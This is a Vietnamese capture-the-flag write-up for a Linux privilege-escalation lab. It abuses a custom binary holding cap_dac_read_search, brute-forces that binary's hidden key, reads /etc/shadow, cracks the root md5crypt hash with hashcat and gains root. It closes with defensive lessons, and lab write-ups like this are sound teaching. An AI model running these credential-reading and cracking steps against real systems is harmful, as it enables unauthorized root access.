---
title: No Sudo
summary: Lợi dụng Linux capability cap_dac_read_search trên một binary tùy chỉnh để đọc /etc/shadow và crack hash root.
---

## Challenge

- **Platform:** Haxagon Battlefield
- **Type:** Linux Priv. Esc. / Reverse Engineering / Passwd Cracking
- **Target:** create file `flag` in `/root`
- **Ràng buộc:** no `sudo` access, no SUID binary

## 1. Enumeration

Kiểm tra quyền của user hiện tại:

```bash
student@eaf464cc5352:~$ id
uid=1000(student) gid=1000(student) groups=1000(student)
```

Kiểm tra `sudo`:

```bash
sudo -l
student is not in the sudoers file.
```

`sudo` bị chặn, nên mình quét Linux Capabilities trên hệ thống:

```bash
getcap -r / 2>/dev/null
```

Kết quả:

```
/usr/bin/readfile cap_dac_read_search=ep
/usr/bin/ping cap_net_raw=ep
```

**Điểm yếu:** binary tùy chỉnh `/usr/bin/readfile` có capability `cap_dac_read_search=ep`, cho phép chương trình bỏ qua mọi kiểm soát quyền đọc của Linux, tức là có thể đọc bất kỳ file nào trên hệ thống, kể cả `/etc/shadow` hay file trong `/root`.

## 2. Reverse engineering /usr/bin/readfile

```bash
student@eaf464cc5352:~$ /usr/bin/readfile /etc/passwd
Usage: /usr/bin/readfile <file> <secret_key>
```

Binary nhận hai tham số: file cần đọc và secret key.

Dùng `objdump` đọc `.rodata` để tìm các chuỗi cố định:

```bash
objdump -s -j .rodata /usr/bin/readfile
```

Kết quả, các đoạn chuỗi nằm rải rác. Tìm được các chuỗi cố định: `go`, `t8s`, `oJHu`, `NzTH`, `JTDDAfq`.

Chương trình ghép 5 mảnh chuỗi này bằng `%s%s%s%s%s` qua `snprintf`. Vì thứ tự nạp thanh ghi/stack có thể khác, viết script Python thử toàn bộ 5! = 120 hoán vị ngay trên target:

```python
import itertools, subprocess

parts = ["go", "t8s", "oJHu", "NzTH", "JTDDAfq"]
for p in itertools.permutations(parts):
    key = "".join(p)
    out = subprocess.getoutput(f"/usr/bin/readfile /etc/passwd {key}")
    if "Access Denied" not in out and "Usage:" not in out:
        print(f"\n[+] KEY FOUND: {key}\n")
        break
```

Key found: `oJHut8sgoJTDDAfqNzTH`

## 3. Đọc file và lấy passwd

```bash
/usr/bin/readfile /etc/shadow oJHut8sgoJTDDAfqNzTH
```

Output:

```
root:$1.../:20206:0:99999:7:::
...
```

Lấy được hash `$1.../`, đây là MD5 crypt.

## 4. Crack hash

Sau đó mình crack hash bằng hashcat:

- Hash type (`-m`): `500` (md5crypt)
- Attack mode (`-a`): `0` (wordlist)
- Wordlist: `rockyou.txt`

```bash
hashcat -m 500 -a 0 --username hash.txt rockyou.txt
```

Sau khi crack xong, mình lấy được password.

## 5. Priv. esc.

```bash
student@eaf464cc5352:~$ su root
Password: <PASSWD>
root@eaf464cc5352:~# whoami
root
```

Vào được root rồi :), giờ chỉ cần tạo file flag tại `/root/flag`:

```bash
touch /root/flag
```

## Takeaways

1. **Linux Capabilities:** gán `cap_dac_read_search` cho một binary tùy chỉnh mà không kiểm soát chặt sẽ biến nó thành công cụ đọc file tùy ý.
2. **Obfuscation thất bại:** chia nhỏ chuỗi bí mật trong mã nguồn rồi ghép lại lúc runtime không chống được static analysis (đọc `.rodata`) và brute-force hoán vị.
3. **Thuật toán băm yếu:** MD5-crypt (`$1$`) dễ bị bẻ khóa nhanh với GPU hiện đại.
